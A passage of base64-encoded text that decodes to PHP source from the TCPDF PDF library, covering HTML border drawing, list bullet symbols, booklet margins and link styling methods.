kaW5hdGVzIHRvIGRyYXcgYW4gaHRtbCBib3JkZXIKCSAqIEByZXR1cm4gYXJyYXkgY29udGFpbmluZyB0b3AtbGVmdCBib3JkZXIgY29vcmRpbmF0ZXMKCSAqIEBwcm90ZWN0ZWQKCSAqIEBzaW5jZSA1LjcuMDAwICgyMDEwLTA4LTAzKQoJICovCglwcm90ZWN0ZWQgZnVuY3Rpb24gZ2V0Qm9yZGVyU3RhcnRQb3NpdGlvbigpIHsKCQlpZiAoJHRoaXMtPnJ0bCkgewoJCQkkeG1heCA9ICR0aGlzLT5sTWFyZ2luOwoJCX0gZWxzZSB7CgkJCSR4bWF4ID0gJHRoaXMtPncgLSAkdGhpcy0+ck1hcmdpbjsKCQl9CgkJcmV0dXJuIGFycmF5KCdwYWdlJyA9PiAkdGhpcy0+cGFnZSwgJ2NvbHVtbicgPT4gJHRoaXMtPmN1cnJlbnRfY29sdW1uLCAneCcgPT4gJHRoaXMtPngsICd5JyA9PiAkdGhpcy0+eSwgJ3htYXgnID0+ICR4bWF4KTsKCX0KCgkvKioKCSAqIERyYXcgYW4gSFRNTCBibG9jayBib3JkZXIgYW5kIGZpbGwKCSAqIEBwYXJhbSBhcnJheSAkdGFnIGFycmF5IG9mIHRhZyBwcm9wZXJ0aWVzLgoJICogQHBhcmFtIGludCAkeG1heCBlbmQgWCBjb29yZGluYXRlIGZvciBib3JkZXIuCgkgKiBAcHJvdGVjdGVkCgkgKiBAc2luY2UgNS43LjAwMCAoMjAxMC0wOC0wMykKCSAqLwoJcHJvdGVjdGVkIGZ1bmN0aW9uIGRyYXdIVE1MVGFnQm9yZGVyKCR0YWcsICR4bWF4KSB7CgkJaWYgKCFpc3NldCgkdGFnWydib3JkZXJwb3NpdGlvbiddKSkgewoJCQkvLyBub3RoaW5nIHRvIGRyYXcKCQkJcmV0dXJuOwoJCX0KCQkkcHJldl94ID0gJHRoaXMtPng7CgkJJHByZXZfeSA9ICR0aGlzLT55OwoJCSRwcmV2X2xhc3RoID0gJHRoaXMtPmxhc3RoOwoJCSRib3JkZXIgPSAwOwoJCSRmaWxsID0gZmFsc2U7CgkJJHRoaXMtPmxhc3RoID0gMDsKCQlpZiAoaXNzZXQoJHRhZ1snYm9yZGVyJ10pIEFORCAhZW1wdHkoJHRhZ1snYm9yZGVyJ10pKSB7CgkJCS8vIGdldCBib3JkZXIgc3R5bGUKCQkJJGJvcmRlciA9ICR0YWdbJ2JvcmRlciddOwoJCQlpZiAoIVRDUERGX1NUQVRJQzo6ZW1wdHlfc3RyaW5nKCR0aGlzLT50aGVhZCkgQU5EICghJHRoaXMtPmludGhlYWQpKSB7CgkJCQkvLyBib3JkZXIgZm9yIHRhYmxlIGhlYWRlcgoJCQkJJGJvcmRlciA9IFRDUERGX1NUQVRJQzo6Z2V0Qm9yZGVyTW9kZSgkYm9yZGVyLCAkcG9zaXRpb249J21pZGRsZScsICR0aGlzLT5vcGVuY2VsbCk7CgkJCX0KCQl9CgkJaWYgKGlzc2V0KCR0YWdbJ2JnY29sb3InXSkgQU5EICgkdGFnWydiZ2NvbG9yJ10gIT09IGZhbHNlKSkgewoJCQkvLyBnZXQgYmFja2dyb3VuZCBjb2xvcgoJCQkkb2xkX2JnY29sb3IgPSAkdGhpcy0+Ymdjb2xvcjsKCQkJJHRoaXMtPnNldEZpbGxDb2xvckFycmF5KCR0YWdbJ2JnY29sb3InXSk7CgkJCSRmaWxsID0gdHJ1ZTsKCQl9CgkJaWYgKCEkYm9yZGVyIEFORCAhJGZpbGwpIHsKCQkJLy8gbm90aGluZyB0byBkcmF3CgkJCXJldHVybjsKCQl9CgkJaWYgKGlzc2V0KCR0YWdbJ2F0dHJpYnV0ZSddWydjZWxsc3BhY2luZyddKSkgewoJCQkkY2xzcCA9ICR0aGlzLT5nZXRIVE1MVW5pdFRvVW5pdHMoJHRhZ1snYXR0cmlidXRlJ11bJ2NlbGxzcGFjaW5nJ10sIDEsICdweCcpOwoJCQkkY2VsbHNwYWNpbmcgPSBhcnJheSgnSCcgPT4gJGNsc3AsICdWJyA9PiAkY2xzcCk7CgkJfSBlbHNlaWYgKGlzc2V0KCR0YWdbJ2JvcmRlci1zcGFjaW5nJ10pKSB7CgkJCSRjZWxsc3BhY2luZyA9ICR0YWdbJ2JvcmRlci1zcGFjaW5nJ107CgkJfSBlbHNlIHsKCQkJJGNlbGxzcGFjaW5nID0gYXJyYXkoJ0gnID0+IDAsICdWJyA9PiAwKTsKCQl9CgkJaWYgKCgkdGFnWyd2YWx1ZSddICE9ICd0YWJsZScpIEFORCAoaXNfYXJyYXkoJGJvcmRlcikpIEFORCAoIWVtcHR5KCRib3JkZXIpKSkgewoJCQkvLyBkcmF3IHRoZSBib3JkZXIgZXh0ZXJuYWxseSByZXNwZWN0IHRoZSBzcWFyZSBlZGdlLgoJCQkkYm9yZGVyWydtb2RlJ10gPSAnZXh0JzsKCQl9CgkJaWYgKCR0aGlzLT5ydGwpIHsKCQkJaWYgKCR4bWF4ID49ICR0YWdbJ2JvcmRlcnBvc2l0aW9uJ11bJ3gnXSkgewoJCQkJJHhtYXggPSAkdGFnWydib3JkZXJwb3NpdGlvbiddWyd4bWF4J107CgkJCX0KCQkJJHcgPSAoJHRhZ1snYm9yZGVycG9zaXRpb24nXVsneCddIC0gJHhtYXgpOwoJCX0gZWxzZSB7CgkJCWlmICgkeG1heCA8PSAkdGFnWydib3JkZXJwb3NpdGlvbiddWyd4J10pIHsKCQkJCSR4bWF4ID0gJHRhZ1snYm9yZGVycG9zaXRpb24nXVsneG1heCddOwoJCQl9CgkJCSR3ID0gKCR4bWF4IC0gJHRhZ1snYm9yZGVycG9zaXRpb24nXVsneCddKTsKCQl9CgkJaWYgKCR3IDw9IDApIHsKCQkJcmV0dXJuOwoJCX0KCQkkdyArPSAkY2VsbHNwYWNpbmdbJ0gnXTsKCQkkc3RhcnRwYWdlID0gJHRhZ1snYm9yZGVycG9zaXRpb24nXVsncGFnZSddOwoJCSRzdGFydGNvbHVtbiA9ICR0YWdbJ2JvcmRlcnBvc2l0aW9uJ11bJ2NvbHVtbiddOwoJCSR4ID0gJHRhZ1snYm9yZGVycG9zaXRpb24nXVsneCddOwoJCSR5ID0gJHRhZ1snYm9yZGVycG9zaXRpb24nXVsneSddOwoJCSRlbmRwYWdlID0gJHRoaXMtPnBhZ2U7CgkJJHN0YXJ0eSA9ICR0YWdbJ2JvcmRlcnBvc2l0aW9uJ11bJ3knXSAtICRjZWxsc3BhY2luZ1snViddOwoJCSRjdXJyZW50WSA9ICR0aGlzLT55OwoJCSR0aGlzLT54ID0gJHg7CgkJLy8gZ2V0IGxhdGVzdCBjb2x1bW4KCQkkZW5kY29sdW1uID0gJHRoaXMtPmN1cnJlbnRfY29sdW1uOwoJCWlmICgkdGhpcy0+bnVtX2NvbHVtbnMgPT0gMCkgewoJCQkkdGhpcy0+bnVtX2NvbHVtbnMgPSAxOwoJCX0KCQkvLyBnZXQgYm9yZGVyIG1vZGVzCgkJJGJvcmRlcl9zdGFydCA9IFRDUERGX1NUQVRJQzo6Z2V0Qm9yZGVyTW9kZSgkYm9yZGVyLCAkcG9zaXRpb249J3N0YXJ0JywgJHRoaXMtPm9wZW5jZWxsKTsKCQkkYm9yZGVyX2VuZCA9IFRDUERGX1NUQVRJQzo6Z2V0Qm9yZGVyTW9kZSgkYm9yZGVyLCAkcG9zaXRpb249J2VuZCcsICR0aGlzLT5vcGVuY2VsbCk7CgkJJGJvcmRlcl9taWRkbGUgPSBUQ1BERl9TVEFUSUM6OmdldEJvcmRlck1vZGUoJGJvcmRlciwgJHBvc2l0aW9uPSdtaWRkbGUnLCAkdGhpcy0+b3BlbmNlbGwpOwoJCS8vIHRlbXBvcmFyeSBkaXNhYmxlIHBhZ2UgcmVnaW9ucwoJCSR0ZW1wX3BhZ2VfcmVnaW9ucyA9ICR0aGlzLT5wYWdlX3JlZ2lvbnM7CgkJJHRoaXMtPnBhZ2VfcmVnaW9ucyA9IGFycmF5KCk7CgkJLy8gZGVzaWduIGJvcmRlcnMgYXJvdW5kIEhUTUwgY2VsbHMuCgkJZm9yICgkcGFnZSA9ICRzdGFydHBhZ2U7ICRwYWdlIDw9ICRlbmRwYWdlOyArKyRwYWdlKSB7IC8vIGZvciBlYWNoIHBhZ2UKCQkJJGNjb2RlID0gJyc7CgkJCSR0aGlzLT5zZXRQYWdlKCRwYWdlKTsKCQkJaWYgKCR0aGlzLT5udW1fY29sdW1ucyA8IDIpIHsKCQkJCS8vIHNpbmdsZS1jb2x1bW4gbW9kZQoJCQkJJHRoaXMtPnggPSAkeDsKCQkJCSR0aGlzLT55ID0gJHRoaXMtPnRNYXJnaW47CgkJCX0KCQkJLy8gYWNjb3VudCBmb3IgbWFyZ2luIGNoYW5nZXMKCQkJaWYgKCRwYWdlID4gJHN0YXJ0cGFnZSkgewoJCQkJaWYgKCgkdGhpcy0+cnRsKSBBTkQgKCR0aGlzLT5wYWdlZGltWyRwYWdlXVsnb3JtJ10gIT0gJHRoaXMtPnBhZ2VkaW1bJHN0YXJ0cGFnZV1bJ29ybSddKSkgewoJCQkJCSR0aGlzLT54IC09ICgkdGhpcy0+cGFnZWRpbVskcGFnZV1bJ29ybSddIC0gJHRoaXMtPnBhZ2VkaW1bJHN0YXJ0cGFnZV1bJ29ybSddKTsKCQkJCX0gZWxzZWlmICgoISR0aGlzLT5ydGwpIEFORCAoJHRoaXMtPnBhZ2VkaW1bJHBhZ2VdWydvbG0nXSAhPSAkdGhpcy0+cGFnZWRpbVskc3RhcnRwYWdlXVsnb2xtJ10pKSB7CgkJCQkJJHRoaXMtPnggKz0gKCR0aGlzLT5wYWdlZGltWyRwYWdlXVsnb2xtJ10gLSAkdGhpcy0+cGFnZWRpbVskc3RhcnRwYWdlXVsnb2xtJ10pOwoJCQkJfQoJCQl9CgkJCWlmICgkc3RhcnRwYWdlID09ICRlbmRwYWdlKSB7CgkJCQkvLyBzaW5nbGUgcGFnZQoJCQkJZm9yICgkY29sdW1uID0gJHN0YXJ0Y29sdW1uOyAkY29sdW1uIDw9ICRlbmRjb2x1bW47ICsrJGNvbHVtbikgeyAvLyBmb3IgZWFjaCBjb2x1bW4KCQkJCQkkdGhpcy0+c2VsZWN0Q29sdW1uKCRjb2x1bW4pOwoJCQkJCWlmICgkc3RhcnRjb2x1bW4gPT0gJGVuZGNvbHVtbikgeyAvLyBzaW5nbGUgY29sdW1uCgkJCQkJCSRjYm9yZGVyID0gJGJvcmRlcjsKCQkJCQkJJGggPSAoJGN1cnJlbnRZIC0gJHkpICsgJGNlbGxzcGFjaW5nWydWJ107CgkJCQkJCSR0aGlzLT55ID0gJHN0YXJ0eTsKCQkJCQl9IGVsc2VpZiAoJGNvbHVtbiA9PSAkc3RhcnRjb2x1bW4pIHsgLy8gZmlyc3QgY29sdW1uCgkJCQkJCSRjYm9yZGVyID0gJGJvcmRlcl9zdGFydDsKCQkJCQkJJHRoaXMtPnkgPSAkc3RhcnR5OwoJCQkJCQkkaCA9ICR0aGlzLT5oIC0gJHRoaXMtPnkgLSAkdGhpcy0+Yk1hcmdpbjsKCQkJCQl9IGVsc2VpZiAoJGNvbHVtbiA9PSAkZW5kY29sdW1uKSB7IC8vIGVuZCBjb2x1bW4KCQkJCQkJJGNib3JkZXIgPSAkYm9yZGVyX2VuZDsKCQkJCQkJJGggPSAkY3VycmVudFkgLSAkdGhpcy0+eTsKCQkJCQl9IGVsc2UgeyAvLyBtaWRkbGUgY29sdW1uCgkJCQkJCSRjYm9yZGVyID0gJGJvcmRlcl9taWRkbGU7CgkJCQkJCSRoID0gJHRoaXMtPmggLSAkdGhpcy0+eSAtICR0aGlzLT5iTWFyZ2luOwoJCQkJCX0KCQkJCQkkY2NvZGUgLj0gJHRoaXMtPmdldENlbGxDb2RlKCR3LCAkaCwgJycsICRjYm9yZGVyLCAxLCAnJywgJGZpbGwsICcnLCAwLCB0cnVlKS4iXG4iOwoJCQkJfSAvLyBlbmQgZm9yIGVhY2ggY29sdW1uCgkJCX0gZWxzZWlmICgkcGFnZSA9PSAkc3RhcnRwYWdlKSB7IC8vIGZpcnN0IHBhZ2UKCQkJCWZvciAoJGNvbHVtbiA9ICRzdGFydGNvbHVtbjsgJGNvbHVtbiA8ICR0aGlzLT5udW1fY29sdW1uczsgKyskY29sdW1uKSB7IC8vIGZvciBlYWNoIGNvbHVtbgoJCQkJCSR0aGlzLT5zZWxlY3RDb2x1bW4oJGNvbHVtbik7CgkJCQkJaWYgKCRjb2x1bW4gPT0gJHN0YXJ0Y29sdW1uKSB7IC8vIGZpcnN0IGNvbHVtbgoJCQkJCQkkY2JvcmRlciA9ICRib3JkZXJfc3RhcnQ7CgkJCQkJCSR0aGlzLT55ID0gJHN0YXJ0eTsKCQkJCQkJJGggPSAkdGhpcy0+aCAtICR0aGlzLT55IC0gJHRoaXMtPmJNYXJnaW47CgkJCQkJfSBlbHNlIHsgLy8gbWlkZGxlIGNvbHVtbgoJCQkJCQkkY2JvcmRlciA9ICRib3JkZXJfbWlkZGxlOwoJCQkJCQkkaCA9ICR0aGlzLT5oIC0gJHRoaXMtPnkgLSAkdGhpcy0+Yk1hcmdpbjsKCQkJCQl9CgkJCQkJJGNjb2RlIC49ICR0aGlzLT5nZXRDZWxsQ29kZSgkdywgJGgsICcnLCAkY2JvcmRlciwgMSwgJycsICRmaWxsLCAnJywgMCwgdHJ1ZSkuIlxuIjsKCQkJCX0gLy8gZW5kIGZvciBlYWNoIGNvbHVtbgoJCQl9IGVsc2VpZiAoJHBhZ2UgPT0gJGVuZHBhZ2UpIHsgLy8gbGFzdCBwYWdlCgkJCQlmb3IgKCRjb2x1bW4gPSAwOyAkY29sdW1uIDw9ICRlbmRjb2x1bW47ICsrJGNvbHVtbikgeyAvLyBmb3IgZWFjaCBjb2x1bW4KCQkJCQkkdGhpcy0+c2VsZWN0Q29sdW1uKCRjb2x1bW4pOwoJCQkJCWlmICgkY29sdW1uID09ICRlbmRjb2x1bW4pIHsKCQkJCQkJLy8gZW5kIGNvbHVtbgoJCQkJCQkkY2JvcmRlciA9ICRib3JkZXJfZW5kOwoJCQkJCQkkaCA9ICRjdXJyZW50WSAtICR0aGlzLT55OwoJCQkJCX0gZWxzZSB7CgkJCQkJCS8vIG1pZGRsZSBjb2x1bW4KCQkJCQkJJGNib3JkZXIgPSAkYm9yZGVyX21pZGRsZTsKCQkJCQkJJGggPSAkdGhpcy0+aCAtICR0aGlzLT55IC0gJHRoaXMtPmJNYXJnaW47CgkJCQkJfQoJCQkJCSRjY29kZSAuPSAkdGhpcy0+Z2V0Q2VsbENvZGUoJHcsICRoLCAnJywgJGNib3JkZXIsIDEsICcnLCAkZmlsbCwgJycsIDAsIHRydWUpLiJcbiI7CgkJCQl9IC8vIGVuZCBmb3IgZWFjaCBjb2x1bW4KCQkJfSBlbHNlIHsgLy8gbWlkZGxlIHBhZ2UKCQkJCWZvciAoJGNvbHVtbiA9IDA7ICRjb2x1bW4gPCAkdGhpcy0+bnVtX2NvbHVtbnM7ICsrJGNvbHVtbikgeyAvLyBmb3IgZWFjaCBjb2x1bW4KCQkJCQkkdGhpcy0+c2VsZWN0Q29sdW1uKCRjb2x1bW4pOwoJCQkJCSRjYm9yZGVyID0gJGJvcmRlcl9taWRkbGU7CgkJCQkJJGggPSAkdGhpcy0+aCAtICR0aGlzLT55IC0gJHRoaXMtPmJNYXJnaW47CgkJCQkJJGNjb2RlIC49ICR0aGlzLT5nZXRDZWxsQ29kZSgkdywgJGgsICcnLCAkY2JvcmRlciwgMSwgJycsICRmaWxsLCAnJywgMCwgdHJ1ZSkuIlxuIjsKCQkJCX0gLy8gZW5kIGZvciBlYWNoIGNvbHVtbgoJCQl9CgkJCWlmICgkY2JvcmRlciBPUiAkZmlsbCkgewoJCQkJJG9mZnNldGxlbiA9IHN0cmxlbigkY2NvZGUpOwoJCQkJLy8gZHJhdyBib3JkZXIgYW5kIGZpbGwKCQkJCWlmICgkdGhpcy0+aW54b2JqKSB7CgkJCQkJLy8gd2UgYXJlIGluc2lkZSBhbiBYT2JqZWN0IHRlbXBsYXRlCgkJCQkJaWYgKGVuZCgkdGhpcy0+eG9iamVjdHNbJHRoaXMtPnhvYmppZF1bJ3RyYW5zZm1yayddKSAhPT0gZmFsc2UpIHsKCQkJCQkJJHBhZ2VtYXJra2V5ID0ga2V5KCR0aGlzLT54b2JqZWN0c1skdGhpcy0+eG9iamlkXVsndHJhbnNmbXJrJ10pOwoJCQkJCQkkcGFnZW1hcmsgPSAkdGhpcy0+eG9iamVjdHNbJHRoaXMtPnhvYmppZF1bJ3RyYW5zZm1yayddWyRwYWdlbWFya2tleV07CgkJCQkJCSR0aGlzLT54b2JqZWN0c1skdGhpcy0+eG9iamlkXVsndHJhbnNmbXJrJ11bJHBhZ2VtYXJra2V5XSArPSAkb2Zmc2V0bGVuOwoJCQkJCX0gZWxzZSB7CgkJCQkJCSRwYWdlbWFyayA9ICR0aGlzLT54b2JqZWN0c1skdGhpcy0+eG9iamlkXVsnaW50bXJrJ107CgkJCQkJCSR0aGlzLT54b2JqZWN0c1skdGhpcy0+eG9iamlkXVsnaW50bXJrJ10gKz0gJG9mZnNldGxlbjsKCQkJCQl9CgkJCQkJJHBhZ2VidWZmID0gJHRoaXMtPnhvYmplY3RzWyR0aGlzLT54b2JqaWRdWydvdXRkYXRhJ107CgkJCQkJJHBzdGFydCA9IHN1YnN0cigkcGFnZWJ1ZmYsIDAsICRwYWdlbWFyayk7CgkJCQkJJHBlbmQgPSBzdWJzdHIoJHBhZ2VidWZmLCAkcGFnZW1hcmspOwoJCQkJCSR0aGlzLT54b2JqZWN0c1skdGhpcy0+eG9iamlkXVsnb3V0ZGF0YSddID0gJHBzdGFydC4kY2NvZGUuJHBlbmQ7CgkJCQl9IGVsc2UgewoJCQkJCWlmIChlbmQoJHRoaXMtPnRyYW5zZm1ya1skdGhpcy0+cGFnZV0pICE9PSBmYWxzZSkgewoJCQkJCQkkcGFnZW1hcmtrZXkgPSBrZXkoJHRoaXMtPnRyYW5zZm1ya1skdGhpcy0+cGFnZV0pOwoJCQkJCQkkcGFnZW1hcmsgPSAkdGhpcy0+dHJhbnNmbXJrWyR0aGlzLT5wYWdlXVskcGFnZW1hcmtrZXldOwoJCQkJCX0gZWxzZWlmICgkdGhpcy0+SW5Gb290ZXIpIHsKCQkJCQkJJHBhZ2VtYXJrID0gJHRoaXMtPmZvb3RlcnBvc1skdGhpcy0+cGFnZV07CgkJCQkJfSBlbHNlIHsKCQkJCQkJJHBhZ2VtYXJrID0gJHRoaXMtPmludG1ya1skdGhpcy0+cGFnZV07CgkJCQkJfQoJCQkJCSRwYWdlYnVmZiA9ICR0aGlzLT5nZXRQYWdlQnVmZmVyKCR0aGlzLT5wYWdlKTsKCQkJCQkkcHN0YXJ0ID0gc3Vic3RyKCRwYWdlYnVmZiwgMCwgJHBhZ2VtYXJrKTsKCQkJCQkkcGVuZCA9IHN1YnN0cigkcGFnZWJ1ZmYsICRwYWdlbWFyayk7CgkJCQkJJHRoaXMtPnNldFBhZ2VCdWZmZXIoJHRoaXMtPnBhZ2UsICRwc3RhcnQuJGNjb2RlLiRwZW5kKTsKCQkJCQkkdGhpcy0+Ym9yZGVybXJrWyR0aGlzLT5wYWdlXSArPSAkb2Zmc2V0bGVuOwoJCQkJCSR0aGlzLT5jbnRtcmtbJHRoaXMtPnBhZ2VdICs9ICRvZmZzZXRsZW47CgkJCQl9CgkJCX0KCQl9IC8vIGVuZCBmb3IgZWFjaCBwYWdlCgkJLy8gcmVzdG9yZSBwYWdlIHJlZ2lvbnMKCQkkdGhpcy0+cGFnZV9yZWdpb25zID0gJHRlbXBfcGFnZV9yZWdpb25zOwoJCWlmIChpc3NldCgkb2xkX2JnY29sb3IpKSB7CgkJCS8vIHJlc3RvcmUgYmFja2dyb3VuZCBjb2xvcgoJCQkkdGhpcy0+c2V0RmlsbENvbG9yQXJyYXkoJG9sZF9iZ2NvbG9yKTsKCQl9CgkJLy8gcmVzdG9yZSBwb2ludGVyIHBvc2l0aW9uCgkJJHRoaXMtPnggPSAkcHJldl94OwoJCSR0aGlzLT55ID0gJHByZXZfeTsKCQkkdGhpcy0+bGFzdGggPSAkcHJldl9sYXN0aDsKCX0KCgkvKioKCSAqIFNldCB0aGUgZGVmYXVsdCBidWxsZXQgdG8gYmUgdXNlZCBhcyBMSSBidWxsZXQgc3ltYm9sCgkgKiBAcGFyYW0gc3RyaW5nICRzeW1ib2wgY2hhcmFjdGVyIG9yIHN0cmluZyB0byBiZSB1c2VkIChsZWdhbCB2YWx1ZXMgYXJlOiAnJyA9IGF1dG9tYXRpYywgJyEnID0gYXV0byBidWxsZXQsICcjJyA9IGF1dG8gbnVtYmVyaW5nLCAnZGlzYycsICdkaXNjJywgJ2NpcmNsZScsICdzcXVhcmUnLCAnMScsICdkZWNpbWFsJywgJ2RlY2ltYWwtbGVhZGluZy16ZXJvJywgJ2knLCAnbG93ZXItcm9tYW4nLCAnSScsICd1cHBlci1yb21hbicsICdhJywgJ2xvd2VyLWFscGhhJywgJ2xvd2VyLWxhdGluJywgJ0EnLCAndXBwZXItYWxwaGEnLCAndXBwZXItbGF0aW4nLCAnbG93ZXItZ3JlZWsnLCAnaW1nfHR5cGV8d2lkdGh8aGVpZ2h0fGltYWdlLmV4dCcpCgkgKiBAcHVibGljCgkgKiBAc2luY2UgNC4wLjAyOCAoMjAwOC0wOS0yNikKCSAqLwoJcHVibGljIGZ1bmN0aW9uIHNldExJc3ltYm9sKCRzeW1ib2w9JyEnKSB7CgkJLy8gY2hlY2sgZm9yIGN1c3RvbSBpbWFnZSBzeW1ib2wKCQlpZiAoc3Vic3RyKCRzeW1ib2wsIDAsIDQpID09ICdpbWd8JykgewoJCQkkdGhpcy0+bGlzeW1ib2wgPSAkc3ltYm9sOwoJCQlyZXR1cm47CgkJfQoJCSRzeW1ib2wgPSBzdHJ0b2xvd2VyKCRzeW1ib2wpOwoJCSR2YWxpZF9zeW1ib2xzID0gYXJyYXkoJyEnLCAnIycsICdkaXNjJywgJ2NpcmNsZScsICdzcXVhcmUnLCAnMScsICdkZWNpbWFsJywgJ2RlY2ltYWwtbGVhZGluZy16ZXJvJywgJ2knLCAnbG93ZXItcm9tYW4nLCAnSScsICd1cHBlci1yb21hbicsICdhJywgJ2xvd2VyLWFscGhhJywgJ2xvd2VyLWxhdGluJywgJ0EnLCAndXBwZXItYWxwaGEnLCAndXBwZXItbGF0aW4nLCAnbG93ZXItZ3JlZWsnKTsKCQlpZiAoaW5fYXJyYXkoJHN5bWJvbCwgJHZhbGlkX3N5bWJvbHMpKSB7CgkJCSR0aGlzLT5saXN5bWJvbCA9ICRzeW1ib2w7CgkJfSBlbHNlIHsKCQkJJHRoaXMtPmxpc3ltYm9sID0gJyc7CgkJfQoJfQoKCS8qKgoJICogU2V0IHRoZSBib29rbGV0IG1vZGUgZm9yIGRvdWJsZS1zaWRlZCBwYWdlcy4KCSAqIEBwYXJhbSBib29sZWFuICRib29rbGV0IHRydWUgc2V0IHRoZSBib29rbGV0IG1vZGUgb24sIGZhbHNlIG90aGVyd2lzZS4KCSAqIEBwYXJhbSBmbG9hdCAkaW5uZXIgSW5uZXIgcGFnZSBtYXJnaW4uCgkgKiBAcGFyYW0gZmxvYXQgJG91dGVyIE91dGVyIHBhZ2UgbWFyZ2luLgoJICogQHB1YmxpYwoJICogQHNpbmNlIDQuMi4wMDAgKDIwMDgtMTAtMjkpCgkgKi8KCXB1YmxpYyBmdW5jdGlvbiBzZXRCb29rbGV0KCRib29rbGV0PXRydWUsICRpbm5lcj0tMSwgJG91dGVyPS0xKSB7CgkJJHRoaXMtPmJvb2tsZXQgPSAkYm9va2xldDsKCQlpZiAoJGlubmVyID49IDApIHsKCQkJJHRoaXMtPmxNYXJnaW4gPSAkaW5uZXI7CgkJfQoJCWlmICgkb3V0ZXIgPj0gMCkgewoJCQkkdGhpcy0+ck1hcmdpbiA9ICRvdXRlcjsKCQl9Cgl9CgoJLyoqCgkgKiBTd2FwIHRoZSBsZWZ0IGFuZCByaWdodCBtYXJnaW5zLgoJICogQHBhcmFtIGJvb2xlYW4gJHJldmVyc2UgaWYgdHJ1ZSBzd2FwIGxlZnQgYW5kIHJpZ2h0IG1hcmdpbnMuCgkgKiBAcHJvdGVjdGVkCgkgKiBAc2luY2UgNC4yLjAwMCAoMjAwOC0xMC0yOSkKCSAqLwoJcHJvdGVjdGVkIGZ1bmN0aW9uIHN3YXBNYXJnaW5zKCRyZXZlcnNlPXRydWUpIHsKCQlpZiAoJHJldmVyc2UpIHsKCQkJLy8gc3dhcCBsZWZ0IGFuZCByaWdodCBtYXJnaW5zCgkJCSRtdGVtcCA9ICR0aGlzLT5vcmlnaW5hbF9sTWFyZ2luOwoJCQkkdGhpcy0+b3JpZ2luYWxfbE1hcmdpbiA9ICR0aGlzLT5vcmlnaW5hbF9yTWFyZ2luOwoJCQkkdGhpcy0+b3JpZ2luYWxfck1hcmdpbiA9ICRtdGVtcDsKCQkJJGRlbHRhbSA9ICR0aGlzLT5vcmlnaW5hbF9sTWFyZ2luIC0gJHRoaXMtPm9yaWdpbmFsX3JNYXJnaW47CgkJCSR0aGlzLT5sTWFyZ2luICs9ICRkZWx0YW07CgkJCSR0aGlzLT5yTWFyZ2luIC09ICRkZWx0YW07CgkJfQoJfQoKCS8qKgoJICogU2V0IHRoZSB2ZXJ0aWNhbCBzcGFjZXMgZm9yIEhUTUwgdGFncy4KCSAqIFRoZSBhcnJheSBtdXN0IGhhdmUgdGhlIGZvbGxvd2luZyBzdHJ1Y3R1cmUgKGV4YW1wbGUpOgoJICogJHRhZ3ZzID0gYXJyYXkoJ2gxJyA9PiBhcnJheSgwID0+IGFycmF5KCdoJyA9PiAnJywgJ24nID0+IDIpLCAxID0+IGFycmF5KCdoJyA9PiAxLjMsICduJyA9PiAxKSkpOwoJICogVGhlIGZpcnN0IGFycmF5IGxldmVsIGNvbnRhaW5zIHRoZSB0YWcgbmFtZXMsCgkgKiB0aGUgc2Vjb25kIGxldmVsIGNvbnRhaW5zIDAgZm9yIG9wZW5pbmcgdGFncyBvciAxIGZvciBjbG9zaW5nIHRhZ3MsCgkgKiB0aGUgdGhpcmQgbGV2ZWwgY29udGFpbnMgdGhlIHZlcnRpY2FsIHNwYWNlIHVuaXQgKGgpIGFuZCB0aGUgbnVtYmVyIHNwYWNlcyB0byBhZGQgKG4pLgoJICogSWYgdGhlIGggcGFyYW1ldGVyIGlzIG5vdCBzcGVjaWZpZWQsIGRlZmF1bHQgdmFsdWVzIGFyZSB1c2VkLgoJICogQHBhcmFtIGFycmF5ICR0YWd2cyBhcnJheSBvZiB0YWdzIGFuZCByZWxhdGl2ZSB2ZXJ0aWNhbCBzcGFjZXMuCgkgKiBAcHVibGljCgkgKiBAc2luY2UgNC4yLjAwMSAoMjAwOC0xMC0zMCkKCSAqLwoJcHVibGljIGZ1bmN0aW9uIHNldEh0bWxWU3BhY2UoJHRhZ3ZzKSB7CgkJJHRoaXMtPnRhZ3ZzcGFjZXMgPSAkdGFndnM7Cgl9CgoJLyoqCgkgKiBTZXQgY3VzdG9tIHdpZHRoIGZvciBsaXN0IGluZGVudGF0aW9uLgoJICogQHBhcmFtIGZsb2F0ICR3aWR0aCB3aWR0aCBvZiB0aGUgaW5kZW50YXRpb24uIFVzZSBuZWdhdGl2ZSB2YWx1ZSB0byBkaXNhYmxlIGl0LgoJICogQHB1YmxpYwoJICogQHNpbmNlIDQuMi4wMDcgKDIwMDgtMTEtMTIpCgkgKi8KCXB1YmxpYyBmdW5jdGlvbiBzZXRMaXN0SW5kZW50V2lkdGgoJHdpZHRoKSB7CgkJcmV0dXJuICR0aGlzLT5jdXN0b21saXN0aW5kZW50ID0gZmxvYXR2YWwoJHdpZHRoKTsKCX0KCgkvKioKCSAqIFNldCB0aGUgdG9wL2JvdHRvbSBjZWxsIHNpZGVzIHRvIGJlIG9wZW4gb3IgY2xvc2VkIHdoZW4gdGhlIGNlbGwgY3Jvc3MgdGhlIHBhZ2UuCgkgKiBAcGFyYW0gYm9vbGVhbiAkaXNvcGVuIGlmIHRydWUga2VlcHMgdGhlIHRvcC9ib3R0b20gYm9yZGVyIG9wZW4gZm9yIHRoZSBjZWxsIHNpZGVzIHRoYXQgY3Jvc3MgdGhlIHBhZ2UuCgkgKiBAcHVibGljCgkgKiBAc2luY2UgNC4yLjAxMCAoMjAwOC0xMS0xNCkKCSAqLwoJcHVibGljIGZ1bmN0aW9uIHNldE9wZW5DZWxsKCRpc29wZW4pIHsKCQkkdGhpcy0+b3BlbmNlbGwgPSAkaXNvcGVuOwoJfQoKCS8qKgoJICogU2V0IHRoZSBjb2xvciBhbmQgZm9udCBzdHlsZSBmb3IgSFRNTCBsaW5rcy4KCSAqIEBwYXJhbSBhcnJheSAkY29sb3IgUkdCIGFycmF5IG9mIGNvbG9ycwoJICogQHBhcmFtIHN0cmluZyAkZm9udHN0eWxlIGFkZGl0aW9uYWwgZm9udCBzdHlsZXMgdG8gYWRkCgkgKiBAcHVibGljCgkgKiBAc2luY2UgNC40LjAwMyAoMjAwOC0xMi0wOSkKCSAqLwoJcHVibGljIGZ1bmN0aW9uIHNldEh0bWxMaW5rc1N0eWxlKCRjb2xvcj1hcnJheSgwLDAsMjU1KSwgJGZvbnRzdHlsZT0nVScpIHsKCQkkdGhpcy0+aHRtbExpbmtDb2xvckFycmF5ID0gJGNvbG9yOwoJCSR0aGlzLT5odG1sTGlua0ZvbnRTdHlsZSA9ICRmb250c3R5bGU7Cgl9CgoJLyoqCgkgKiBDb252ZXJ0IEhUTUwgc3RyaW5nIGNvbnRhaW5pb